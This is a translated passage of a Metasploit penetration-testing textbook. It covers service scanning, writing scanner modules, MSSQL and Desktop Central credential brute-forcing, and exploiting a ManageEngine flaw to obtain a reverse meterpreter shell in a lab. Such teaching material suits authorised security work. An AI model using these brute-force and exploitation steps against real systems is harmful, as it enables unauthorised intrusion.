在第二章中，《识别和扫描目标》，我们将深入了解 Metasploit 的扫描功能。我们将研究各种类型的服务进行扫描，还将研究如何定制已有的模块进行服务扫描。


# 第二章：识别和扫描目标

我们在第一章中学习了 Metasploit 的基础知识，*开始使用 Metasploit*。现在让我们把焦点转移到每次渗透测试的一个重要方面，即扫描阶段。扫描阶段是渗透测试中最关键的部分之一，涉及识别目标上运行的各种软件和服务，因此，它是专业渗透测试中最耗时和最关键的部分。他们说，我引用一句话，"*知己知彼，百战不殆*”。如果你想通过利用易受攻击的软件来访问目标，你需要首先确定目标上是否运行了特定版本的软件。扫描和识别应该进行彻底，这样你就不会在错误的软件版本上执行 DOS 攻击。

在本章中，我们将尝试揭示 Metasploit 的扫描方面，并尝试获得各种扫描模块的实际知识。我们将涵盖以下扫描的关键方面：

+   使用针对 FTP、MSSQL 等服务的扫描模块

+   扫描 SNMP 服务并利用它们

+   使用 Metasploit 辅助工具查找 SSL 和 HTTP 信息

+   开发自定义扫描模块所需的基本要素

+   利用现有模块创建自定义扫描仪

让我们针对目标网络运行一个基本的 FTP 扫描模块，并详细分析其功能。

# 使用 Metasploit 处理 FTP 服务器

我们将在辅助部分的扫描仪中使用`ftp_version.rb`模块进行演示。

# 扫描 FTP 服务

让我们使用`use`命令选择模块，并检查模块需要哪些不同选项才能工作：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00229.jpeg)

我们可以看到我们有许多模块可以使用。但是，现在让我们使用`ftp_version`模块，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00203.jpeg)

为了扫描整个网络，让我们将`RHOSTS`设置为`192.168.10.0/24`（0-255），并增加线程数以加快操作：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00231.jpeg)

让我们运行该模块并分析输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00232.jpeg)

我们可以看到我们已经扫描了整个网络，并发现有两台主机运行 FTP 服务，分别是 TP-LINK FTP 服务器和 FTP Utility FTP 服务器。现在我们知道了目标上运行的服务，如果这些 FTP 服务的版本易受攻击，我们就可以很容易地找到匹配的漏洞利用。

我们还可以看到一些行显示了扫描的进度并生成了混乱的输出。我们可以通过将`ShowProgress`选项的值设置为 false 来关闭显示进度功能，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00233.jpeg)

显然，我们有一个更好的输出，如前面的截图所示。但是，等等！我们之前没有`ShowProgress`选项，对吧？那么它从哪里神奇地出现的呢？如果你能停下来自己尝试弄清楚，那就太好了。如果你知道我们有一个高级选项命令，可以通过在 Metasploit 中传递`show advanced`来调用，我们可以继续进行。

在渗透测试期间，可能需要详细了解测试的细节并获得详细的输出。Metasploit 确实提供了一个详细的功能，可以通过在 Metasploit 控制台中传递`set verbose true`来设置。详细的输出将生成类似于以下截图中的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00234.jpeg)

该模块现在正在打印诸如连接状态等详细信息。

# 修改扫描模块以获取乐趣和利润

在大型测试环境中，分析数百种不同服务并找到易受攻击的服务会有些困难。我会在自定义的扫描模块中保留易受攻击的服务列表，因此一旦遇到特定服务，如果匹配特定横幅，就会标记为易受攻击。识别易受攻击的服务是一个好的做法。例如，如果你有一个拥有 10000 个系统的庞大网络，运行默认的 Metasploit 模块并期望得到格式良好的输出会很困难。在这种情况下，我们可以相应地自定义模块并针对目标运行它。Metasploit 是一个非常好的工具，它提供了内联编辑。因此，您可以使用`edit`命令即时修改模块。但是，您必须选择要编辑的模块。我们可以在以下截图中看到，Metasploit 已经在 VI 编辑器中打开了`ftp_version`模块，并且模块的逻辑也显示出来：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00235.jpeg)

代码非常简单。如果`banner`变量被设置，状态消息将以`rhost`、`rport`和`banner`本身的详细信息打印在屏幕上。假设我们想要向模块添加另一个功能，即检查横幅是否与常见易受攻击的 FTP 服务的特定横幅匹配，我们可以添加以下代码行：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00117.jpeg)

在前面的模块中，我们所做的只是添加了另一个 if-else 块，它将横幅与正则表达式`/FTP\sUtility\sFTP\sserver/`进行匹配。如果横幅与正则表达式匹配，它将表示成功匹配易受攻击的服务，否则将打印出 Not Vulnerable。相当简单，是吧？

然而，在提交更改并编写模块之后，您需要使用`reload`命令重新加载模块。现在让我们运行模块并分析输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00238.jpeg)

是的！我们成功了。由于 TP-LINK FTP 服务器的横幅不匹配我们的正则表达式，因此在控制台上打印出 Not Vulnerable，而其他服务的横幅与我们的正则表达式匹配，因此在控制台上打印出 Vulnerable 消息。

有关编辑和构建新模块的更多信息，请参阅《精通 Metasploit 第二版》的*第二章*。

# 使用 Metasploit 扫描 MSSQL 服务器

现在让我们进入专门用于测试 MSSQL 服务器的 Metasploit 特定模块，并看看我们可以通过使用它们获得什么样的信息。

# 使用 mssql_ping 模块

我们将使用的第一个辅助模块是`mssql_ping`。此模块将收集与 MSSQL 服务器相关的服务信息。

那么，让我们加载模块并按照以下步骤开始扫描过程：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00164.jpeg)

我们可以清楚地看到`mssql_ping`生成了一个关于 MSSQL 服务的优秀输出。

# 暴力破解 MSSQL 密码

Metasploit 还提供了暴力破解模块。成功的暴力破解会利用低熵漏洞；如果在合理的时间内产生结果，就被视为有效发现。因此，在渗透测试的这个阶段，我们将涵盖暴力破解。Metasploit 有一个内置模块名为`mssql_login`，我们可以将其用作 MSSQL 服务器数据库用户名和密码的认证测试器。

让我们加载模块并分析结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00001.jpeg)

我们运行这个模块时，它立即在第一步测试了默认凭据，即使用用户名 sa 和空密码，并发现登录成功。因此，我们可以得出结论，仍然在使用默认凭据。此外，如果 sa 账户没有立即找到，我们必须尝试测试更多的凭据。为了实现这一点，我们将使用包含用于暴力破解 DBMS 用户名和密码的字典的文件名来设置 USER_FILE 和 PASS_FILE 参数：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00016.jpeg)

让我们设置所需的参数；这些是`USER_FILE`列表，`PASS_FILE`列表，以及`RHOSTS`，以成功运行此模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00024.jpeg)

运行此模块针对目标数据库服务器，我们将得到类似以下的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00035.jpeg)

正如我们从上面的结果中可以看到的，我们有两个条目对应于用户在数据库中的成功登录。我们找到了一个默认用户 sa，密码为空，另一个用户 nipun，密码为 12345。

请参考[`github.com/danielmiessler/SecLists/tree/master/Passwords`](https://github.com/danielmiessler/SecLists/tree/master/Passwords)获取一些可以用于密码暴力破解的优秀字典。

有关测试数据库的更多信息，请参阅*Mastering Metasploit First/Second Edition*的*第五章*。

在进行暴力破解时，将`USER_AS_PASS`和`BLANK_PASSWORDS`选项设置为`true`是一个好主意，因为许多管理员会为各种安装保留默认凭据。

# 使用 Metasploit 扫描 SNMP 服务。

让我们对不同网络进行 TCP 端口扫描，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00046.jpeg)

我们将使用在`auxiliary/scanner/portscan`下列出的 tcp 扫描模块，如上图所示。让我们运行该模块并分析结果如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00007.jpeg)

我们可以看到我们只找到了两个看起来不那么吸引人的服务。让我们也对网络进行 UDP 扫描，看看是否能找到一些有趣的东西：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00009.jpeg)

为了进行 UDP 扫描，我们将使用`auxiliary/scanner/discovery/udp_sweep`模块，如上图所示。接下来，我们只需要设置`RHOSTS`选项来提供网络范围。此外，您也可以增加线程数。让我们运行该模块并分析结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00075.jpeg)

太棒了！我们可以看到 UDP 扫描模块生成了大量结果。此外，还在`192.168.1.19`上发现了一个**简单网络管理协议**（SNMP）服务。

SNMP 是一种常用的服务，提供网络管理和监控功能。SNMP 提供了轮询网络设备和监视主机上各种系统的利用率和错误等数据的能力。SNMP 还能够更改主机上的配置，允许远程管理网络设备。SNMP 是易受攻击的，因为它经常自动安装在许多网络设备上，读字符串为`public`，写字符串为`private`。这意味着系统可能被安装到网络上，而没有任何知道 SNMP 正在运行并使用这些默认密钥的知识。

此默认安装的 SNMP 为攻击者提供了在系统上执行侦察的手段，以及可以用来创建拒绝服务的利用。SNMP MIBs 提供诸如系统名称、位置、联系人，有时甚至电话号码等信息。让我们对目标进行 SNMP 扫描，并分析我们遇到的有趣信息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00011.jpeg)

我们将使用`auxiliary/scanner/snmp`中的`snmp_enum`来执行 SNMP 扫描。我们将`RHOSTS`的值设置为`192.168.1.19`，还可以提供线程数。让我们看看会弹出什么样的信息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00012.jpeg)

哇！我们可以看到我们有大量的系统信息，如主机 IP、主机名、联系人、正常运行时间、系统描述，甚至用户账户。找到的用户名在尝试暴力破解攻击时可能会很有用，就像我们在前面的部分中所做的那样。让我们看看我们还得到了什么：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00013.jpeg)

我们还有监听端口（TCP 和 UDP）的列表，连接信息，网络服务列表，进程列表，甚至安装应用程序列表，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00113.jpeg)

因此，SNMP 扫描为我们提供了大量有关目标系统的侦察功能，这可能有助于我们执行诸如社会工程和了解目标上可能运行的各种应用程序的攻击，以便我们可以准备要利用的服务列表并专注于特定服务。

有关 SNMP 扫描的更多信息，请访问[`www.offensive-security.com/metasploit-unleashed/snmp-scan/`](https://www.offensive-security.com/metasploit-unleashed/snmp-scan/)。

# 使用 Metasploit 扫描 NetBIOS 服务

Netbios 服务还提供有关目标的重要信息，并帮助我们揭示目标架构、操作系统版本和许多其他信息。要扫描 NetBIOS 服务的网络，我们可以使用`auxiliary/scanner/netbios`中的`nbname`模块，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00017.jpeg)

我们像以前一样，通过提供 CIDR 标识符将`RHOSTS`设置为整个网络。让我们运行模块并分析结果如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00121.jpeg)

我们可以看到在前面的屏幕截图中列出了几乎每个系统在网络上运行的 NetBIOS 服务。这些信息为我们提供了有关系统的操作系统类型、名称、域和相关 IP 地址的有用证据。

# 使用 Metasploit 扫描 HTTP 服务

Metasploit 允许我们对各种 HTTP 服务进行指纹识别。此外，Metasploit 包含大量针对不同类型的 Web 服务器的利用模块。因此，扫描 HTTP 服务不仅允许对 Web 服务器进行指纹识别，还可以建立 Metasploit 可以稍后攻击的 Web 服务器漏洞的基础。让我们使用`http_version`模块并针对网络运行它如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00125.jpeg)

在设置所有必要的选项（如`RHOSTS`和`Threads`）之后，让我们执行模块如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00020.jpeg)

Metasploit 的`http_version`模块已成功对网络中的各种 Web 服务器软件和应用程序进行了指纹识别。我们将在第三章中利用其中一些服务，*利用和获取访问权限*。我们看到了如何对 HTTP 服务进行指纹识别，所以让我们尝试看看我们是否可以扫描它的大哥，使用 Metasploit 扫描 HTTPS。

# 使用 Metasploit 扫描 HTTPS/SSL

Metasploit 包含 SSL 扫描模块，可以揭示与目标上的 SSL 服务相关的各种信息。让我们快速设置并运行模块如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00022.jpeg)

如前面的屏幕截图所示，我们有来自`auxiliary/scanner/http`的 SSL 模块。现在我们可以设置`RHOSTS`，运行的线程数，如果不是`443`，还可以设置`RPORT`，然后执行模块如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00023.jpeg)

通过分析前面的输出，我们可以看到我们在 IP 地址`192.168.1.8`上放置了一个自签名证书，以及其他详细信息，如 CA 授权、电子邮件地址等。这些信息对执法机构和欺诈调查案件至关重要。曾经有很多情况下，CA 意外地为 SSL 服务签署了恶意软件传播站点。

我们了解了各种 Metasploit 模块。现在让我们深入研究并看看模块是如何构建的。

# 模块构建基础

开始学习模块开发的最佳方法是深入研究现有的 Metasploit 模块，看看它们是如何工作的。让我们看看一些模块，找出当我们运行这些模块时会发生什么。

# Metasploit 模块的格式

Metasploit 模块的骨架相对简单。我们可以在以下代码中看到通用的头部部分：

```
require 'msf/core' 
class MetasploitModule < Msf::Auxiliary 
  def initialize(info = {}) 
    super(update_info(info, 
      'Name'           => 'Module name', 
      'Description'    => %q{ 
       Say something that the user might want to know. 
      }, 
      'Author'         => [ 'Name' ], 
      'License'        => MSF_LICENSE 
    )) 
  end 
def run 
    # Main function 
  end 
end 

```

模块通过包含必要的库和所需的关键字开始，前面的代码后面跟着`msf/core`库。因此，它包括来自`msf`目录的`core`库。

下一个重要的事情是定义类类型，而不是`MetasploitModule`，而是根据 Metasploit 的预期版本，是`Metasploit3`还是`Metasploit4`。在我们定义类类型的同一行中，我们需要设置我们要创建的模块的类型。我们可以看到，我们已经为相同的目的定义了`MSF::Auxiliary`。

在初始化方法中，即 Ruby 中的默认构造函数，我们定义了`Name`、`Description`、`Author`、`Licensing`、`CVE details`等；这个方法涵盖了特定模块的所有相关信息。名称包含了被定位的软件名称；`Description`包含了对漏洞解释的摘录，`Author`是开发模块的人的名字，`License`是前面代码示例中所述的`MSF_LICENSE`。`Auxiliary`模块的主要方法是`run`方法。因此，除非你有很多其他方法，否则所有操作都应该在这个方法上执行。然而，执行仍然将从`run`方法开始。

有关开发模块的更多信息，请参阅*《精通 Metasploit 第一/第二版》*的*第 2、3、4 章*。

有关模块结构的更多信息，请参阅[`www.offensive-security.com/metasploit-unleashed/skeleton-creation/`](https://www.offensive-security.com/metasploit-unleashed/skeleton-creation/)。

# 分解现有的 HTTP 服务器扫描器模块

让我们使用之前使用过的一个简单模块，即 HTTP 版本扫描器，并看看它是如何工作的。这个 Metasploit 模块的路径是`/modules/auxiliary/scanner/http/http_version.rb`。

让我们系统地检查这个模块：

```
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit 
# website for more information on licensing and terms of use. 
# http://metasploit.com/ 
require 'rex/proto/http' 
require 'msf/core' 
class Metasploit3 < Msf::Auxiliary 

```

让我们讨论这里的安排方式。以`#`符号开头的版权行是注释，它们包含在所有 Metasploit 模块中。所需的`'rex/proto/http'`语句要求解释器包含来自`rex`库的所有 HTTP 协议方法的路径。因此，来自`/lib/rex/proto/http`目录的所有文件的路径现在对模块可用，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00025.jpeg)

所有这些文件都包含各种 HTTP 方法，包括建立连接的功能，`GET`和`POST`请求，响应处理等。

在下一步中，需要使用`'msf/core'`语句来包含所有必要的`core`库的路径，如前所述。`Metasploit3`类语句定义了适用于 Metasploit 版本 3 及以上的给定代码。然而，`Msf::Auxiliary`将代码描述为辅助类型模块。现在让我们继续进行如下代码：

```
# Exploit mixins should be called first
include Msf::Exploit::Remote::HttpClient
include Msf::Auxiliary::WmapScanServer
# Scanner mixin should be near last
include Msf::Auxiliary::Scanner

```

前面的部分包括了所有包含在模块中使用的方法的必要库文件。让我们按照以下方式列出这些包含的库的路径：

| 包含语句 | 路径 | 用法 |
| --- | --- | --- |
| `Msf::Exploit::Remote::HttpClient` | `/lib/msf/core/exploit/http/client.rb` | 这个库文件将提供各种方法，比如连接到目标、发送请求、断开客户端等。 |
| `Msf::Auxiliary::WmapScanServer` | `/lib/msf/core/auxiliary/wmapmodule.rb` | 你可能会想，WMAP 是什么？WMAP 是 Metasploit 框架的基于 Web 应用程序的漏洞扫描器附加组件，它通过 Metasploit 帮助进行 Web 测试。 |
| `Msf::Auxiliary::Scanner` | `/lib/msf/core/auxiliary/scanner.rb` | 这个文件包含了基于扫描器的模块的各种功能。这个文件支持不同的方法，比如运行模块、初始化和扫描进度等。 |

需要注意的重要信息是，我们之所以可以包含这些库，是因为我们在前面的部分中定义了所需的`'msf/core'`语句。

让我们来看下一段代码：

```
def initialize 
  super( 
    'Name'        => 'HTTP Version Detection', 
    'Description' => 'Display version information about each system', 
    'Author'      => 'hdm', 
    'License'     => MSF_LICENSE 
  ) 

  register_wmap_options({ 
    'OrderID' => 0, 
    'Require' => {}, 
  }) 
end 

```

这个模块的这部分定义了初始化方法，该方法初始化了基本参数，如`Name`、`Author`、`Description`和`License`，并初始化了 WMAP 参数。现在让我们来看代码的最后一部分：

```
  def run_host(ip) 
    begin 
      connect 
      res = send_request_raw({'uri' => '/', 'method' => 'GET' }) 
      return if not res 
      fp = http_fingerprint(:response => res) 
      print_status("#{ip}:#{rport} #{fp}") if fp 
      rescue ::Timeout::Error, ::Errno::EPIPE 
    end 
  end 
end 

```

前面的函数是扫描器的核心。

# 库和函数

让我们看一些在这个模块中使用的库中的重要函数：

| 函数 | 库文件 | 用法 |
| --- | --- | --- |
| `run_host` | `/lib/msf/core/auxiliary/scanner.rb` | 将为每个主机运行一次的主要方法。 |
| `connect` | `/lib/msf/core/auxiliary/scanner.rb` | 用于与目标主机建立连接。 |
| `send_raw_request` | `/core/exploit/http/client.rb` | 用于向目标发出原始 HTTP 请求的函数。 |
| `request_raw` | `/rex/proto/http/client.rb` | `send_raw_request`传递数据的库。 |
| `http_fingerprint` | `/lib/msf/core/exploit/http/client.rb` | 将 HTTP 响应解析为可用变量。 |

现在让我们了解一下这个模块。在这里，我们有一个名为`run_host`的方法，参数是 IP，用于与所需主机建立连接。`run_host`方法是从`/lib/msf/core/auxiliary/scanner.rb`库文件中引用的。这个方法将为每个主机运行一次，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00026.jpeg)

接下来，我们有`begin`关键字，表示代码块的开始。在下一条语句中，我们有`connect`方法，它建立了与服务器的 HTTP 连接，如前面的表中所讨论的。

接下来，我们定义一个名为`res`的变量，它将存储响应。我们将使用`/core/exploit/http/client.rb`文件中的`send_raw_request`方法，参数为 URI 和请求的方法为`GET`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00028.jpeg)

前面的方法将帮助您连接到服务器，创建请求，发送请求并读取响应。我们将响应保存在`res`变量中。

这个方法将所有参数传递给`/rex/proto/http/client.rb`文件中的`request_raw`方法，其中检查了所有这些参数。我们有很多可以在参数列表中设置的参数。让我们看看它们是什么：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00029.jpeg)

接下来，`res`是一个存储结果的变量。下一条指令返回了如果不是`res`语句的结果。然而，当涉及到成功的请求时，执行下一条命令，将从`/lib/msf/core/exploit/http/client.rb`文件中运行`http_fingerprint`方法，并将结果存储在名为`fp`的变量中。这个方法将记录和过滤诸如 set-cookie、powered-by 和其他类似标头的信息。这个方法需要一个 HTTP 响应数据包来进行计算。因此，我们将提供`:response => res`作为参数，表示应该对之前使用`res`生成的请求接收到的数据进行指纹识别。然而，如果没有给出这个参数，它将重新做一切，并再次从源头获取数据。在下一行，我们简单地打印出响应。最后一行，`rescue:: Timeout::Error`，`:: Errno::EPIPE`，将处理模块超时的异常。

现在，让我们运行这个模块，看看输出是什么：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00030.jpeg)

我们现在已经看到了模块的工作原理。对于所有其他模块，概念都是类似的，您可以轻松地导航到库函数并构建自己的模块。

# 摘要和练习

在本章中，我们广泛涵盖了对数据库、FTP、HTTP、SNMP、NetBIOS、SSL 等各种类型服务的扫描。我们研究了为开发自定义模块以及拆解一些库函数和模块的工作原理。本章将帮助您回答以下一系列问题：

+   如何使用 Metasploit 扫描 FTP、SNMP、SSL、MSSQL、NetBIOS 和其他各种服务？

+   为什么需要同时扫描 TCP 和 UDP 端口？

+   如何内联编辑 Metasploit 模块以获取乐趣和利润？

+   如何将各种库添加到 Metasploit 模块中？

+   您在哪里寻找用于构建新模块的 Metasploit 模块中的函数？

+   Metasploit 模块的格式是什么？

+   如何在 Metasploit 模块中打印状态、信息和错误消息？

您可以尝试以下自学习练习来了解更多关于扫描器的知识：

+   尝试使用在测试中找到的凭据通过 MSSQL 执行系统命令

+   尝试在您的网络上找到一个易受攻击的 Web 服务器，并找到一个匹配的漏洞利用程序；您可以使用 Metasploitable 2 和 Metasploitable 3 进行这个练习

+   尝试编写一个简单的自定义 HTTP 扫描模块，检查特别容易受攻击的 Web 服务器（就像我们为 FTP 所做的那样）

现在是切换到本书中最激动人心的章节-利用阶段的时候了。我们将利用我们从本章学到的知识来利用许多漏洞，并且我们将看到各种情景和瓶颈，以减轻利用。


# 第三章：利用和获取访问权限

在第二章，*识别和扫描目标*中，我们仔细研究了在网络中扫描多个服务并对其精确版本号进行指纹识别。我们必须找到正在运行的服务的确切版本号，以便利用软件特定版本中存在的漏洞。在本章中，我们将利用在第二章，*识别和扫描目标*中学到的策略，通过利用它们的漏洞成功获取对一些系统的访问权限。我们将学习如何做到以下几点：

+   使用 Metasploit 攻击应用程序

+   测试服务器以进行成功利用

+   攻击移动平台与 Metasploit

+   使用基于浏览器的攻击进行客户端测试

+   构建和修改现有的 Metasploit 攻击模块

那么让我们开始吧。

# 设置实践环境

在本章和接下来的章节中，我们将主要在 Metasploitable 2 和 Metasploitable 3（有意设置为易受攻击的操作系统）上进行实践。此外，对于 Metasploitable 发行版中未涵盖的练习，我们将使用我们自定义的环境：

+   请按照说明在[`community.rapid7.com/thread/2007`](https://community.rapid7.com/thread/2007)设置 Metasploitable 2

+   要设置 Metasploitable 3，请参考[`github.com/rapid7/metasploitable3`](https://github.com/rapid7/metasploitable3)

+   请参考优秀的视频教程，在[`www.youtube.com/playlist?list=PLZOToVAK85MpnjpcVtNMwmCxMZRFaY6mT`](https://www.youtube.com/playlist?list=PLZOToVAK85MpnjpcVtNMwmCxMZRFaY6mT)设置 Metasploitable 3

# 利用 Metasploit 进行应用程序攻击

考虑自己在一个 B 类 IP 网络上执行渗透测试。让我们首先为我们的测试添加一个新的`workspace`并切换到它，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00033.jpeg)

通过发出`workspace`命令，后跟`-a`开关，再跟上我们新工作区的名称，我们添加了一个新的`workspace`。通过再次发出`workspace`命令，后跟工作区的名称，即我们的情况下是`ClassBNetwork`，我们切换了我们的`workspace`到我们刚刚创建的工作区。

在整个第二章，*识别和扫描目标*中，我们大量使用了 tcp portscan 辅助模块。让我们再次使用它，看看这个网络上有什么惊喜：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00171.jpeg)

没什么花哨的！我们只有两个开放端口，即端口`80`和端口`22`。让我们通过发出`hosts`命令和`services`命令来验证扫描中找到的信息，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00174.jpeg)

我们可以看到，扫描中捕获的信息现在存储在 Metasploit 的数据库中。但是，我们在扫描中没有发现太多东西。让我们在下一节中运行更准确的扫描。

# 在 Metasploit 中使用 db_nmap

Nmap 是最流行的网络扫描工具之一，在渗透测试和漏洞评估中被广泛使用。Metasploit 的美妙之处在于它通过集成和存储结果将 Nmap 的功能与数据库相结合。让我们通过提供`-sS`开关在目标上运行基本的隐秘扫描。此外，我们使用了`-p-`开关告诉 Nmap 在目标上扫描所有 65,535 个端口，并使用`--open`开关仅列出所有开放的端口（这消除了过滤和关闭的端口），如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00176.jpeg)

我们可以看到提供前面的命令会对目标进行彻底扫描。让我们分析扫描生成的输出如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00181.jpeg)

我们可以看到目标上有许多开放的端口。如果我们发现其中任何一个有漏洞，我们可以将其视为系统的入口点。然而，正如前面讨论的那样，要利用这些服务，我们需要找出软件及其确切的版本号。通过启动服务扫描，`db_nmap`可以通过启动服务扫描来提供正在运行的软件的版本。我们可以通过在先前的扫描命令中添加`-sV`开关来执行类似的服务扫描并重新运行扫描：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00122.jpeg)

太棒了！我们已经对大约 80%的开放端口进行了指纹识别，并获得了它们的确切版本号。我们可以看到目标上运行着许多吸引人的服务。让我们通过发出`services`命令来验证我们从扫描中收集的所有信息是否成功迁移到 Metasploit：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00045.jpeg)

是的！Metasploit 已经记录了一切。让我们针对一些运行在端口`8022`上的 web 服务器软件，比如 Apache Tomcat/Coyote JSP Engine 1.1。然而，在执行任何利用之前，我们应该始终通过手动浏览器访问端口来检查服务器上运行的应用程序，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00194.jpeg)

惊喜！我们在服务器的端口`8022`上发现了桌面中央 9。然而，桌面中央 9 已知存在多个漏洞，其登录系统也可以被暴力破解。现在我们可以将这个应用程序视为我们需要打开的潜在入口，以获得对系统的完全访问。

# 利用 Metasploit 的桌面中央 9

我们在前一节中看到，我们发现了 ManageEngine 的桌面中央 9 软件运行在服务器的端口`8022`上。让我们在 Metasploit 中找到一个匹配的模块，以检查我们是否有任何利用模块或辅助模块可以帮助我们打入应用程序，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00202.jpeg)

列出了许多模块！让我们首先使用最简单的一个，即`auxiliary/scanner/http/manageengine_desktop_central_login`。这个辅助模块允许我们对桌面中央进行凭证暴力破解。通过发出`use`命令，然后跟着`auxiliary/scanner/http/manageengine_desktop_central_login`，我们可以将其投入使用。

另外，让我们也检查一下为使该模块无缝工作我们需要设置哪些选项，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00212.jpeg)

显然，我们需要将`RHOSTS`设置为目标的 IP 地址。如果我们有一个管理员帐户，不仅可以让我们访问，还可以赋予我们执行各种操作的权限，那么打入应用程序将会更有趣。因此，让我们将 USERNAME 设置为`admin`。

暴力破解技术非常耗时。因此，我们可以通过将 THREADS 设置为`20`来增加线程数。我们还需要一个密码列表来尝试。我们可以使用 Kali Linux 中的 CEWL 应用程序快速生成一个密码列表。CEWL 可以快速爬行网站页面，构建可能是应用程序密码的潜在关键字。假设我们有一个名为`nipunjaswal.com`的网站。CEWL 将从网站中提取所有关键字，构建一个潜在的关键字列表，其中包括 Nipun、Metasploit、Exploits、nipunjaswal 等关键字。在我以前的所有渗透测试中，CEWL 的成功率都远高于传统的暴力破解攻击。因此，让我们启动 CEWL 并构建一个目标列表，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00221.jpeg)

我们可以看到 CEWL 已经生成了一个名为`pass.txt`的文件，因为我们使用了`-w`开关来提供要写入的文件的名称。让我们根据 CEWL 生成的文件的路径设置`pass_file`，如下面的截图所示，并运行该模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00052.jpeg)

在一秒钟内，我们得到了正确的用户名和密码组合，即 admin: admin。让我们通过手动登录应用程序来验证：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00237.jpeg)

是的！我们已成功登录应用程序。但是，我们必须注意，我们只是管理了应用程序级别的访问，而不是系统级别的访问。此外，这不能被称为黑客行为，因为我们进行了暴力破解攻击。

CEWL 在自定义 Web 应用程序上更有效，因为管理员在设置新系统时经常倾向于使用他们每天遇到的单词。

为了实现系统级别的访问，让我们再次深入 Metasploit 寻找模块。有趣的是，我们有一个利用模块，即`exploit/windows/http/manageengine_connectionid_write`。让我们使用该模块来完全访问系统：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00008.jpeg)

让我们将`RHOST`和`RPORT`分别设置为`172.28.128.3`和`8022`，然后发出`exploit`命令。默认情况下，Metasploit 将采用反向 meterpreter 载荷，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00002.jpeg)

我们有了 meterpreter 提示，这意味着我们已成功访问了目标系统。不确定背景中发生了什么？您可以通过在模块上发出`info`命令来阅读利用和它所针对的漏洞的描述，这将填充以下详细信息和描述：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00003.jpeg)

